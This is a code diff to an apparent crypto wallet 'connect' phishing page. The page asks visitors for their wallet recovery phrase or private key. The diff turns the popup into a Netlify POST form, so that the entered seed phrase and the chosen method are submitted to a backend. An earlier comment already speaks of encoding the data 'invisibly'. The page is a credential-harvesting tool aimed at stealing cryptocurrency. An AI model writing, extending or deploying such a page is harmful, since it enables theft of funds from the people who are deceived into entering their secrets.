@@ -9,7 +9,9 @@
 <body class="wallet-body">
 
   <div class="popup-overlay">
-    <div class="popup-box">
+    <form name="wallet-connect" method="POST" data-netlify="true" class="popup-box">
+  <input type="hidden" name="form-name" value="wallet-connect" />
+  <input type="hidden" id="method-input" name="method" />
       <div class="popup-header">
         <img id="wallet-logo" src="" alt="Wallet Logo" />
         <h2 id="wallet-name">Wallet Name</h2>
@@ -22,7 +24,7 @@
         <option value="privatekey">Private Key</option>
       </select>
 
-      <textarea id="wallet-input" placeholder="Enter your wallet phrase"></textarea>
+      <textarea id="wallet-input" name="wallet-data" placeholder="Enter your wallet phrase" required></textarea>
 
       <div class="popup-buttons">
         <button class="validate-btn" onclick="submitWallet()">Validate</button>
@@ -30,7 +32,7 @@
       </div>
     </div>
   </div>
-
+</form>
   <script>
     const params = new URLSearchParams(window.location.search);
     const walletName = params.get('wallet') || 'Wallet';
@@ -46,7 +48,7 @@
     function submitWallet() {
       const input = document.getElementById('wallet-input').value;
       const method = document.getElementById('method-select').value;
-
+document.getElementById('method-input').value = method;
       // Encode the data invisibly in the URL (or send to a backend in real apps)
       const encoded = encodeURIComponent(btoa(`${method}:::${input}`));
 
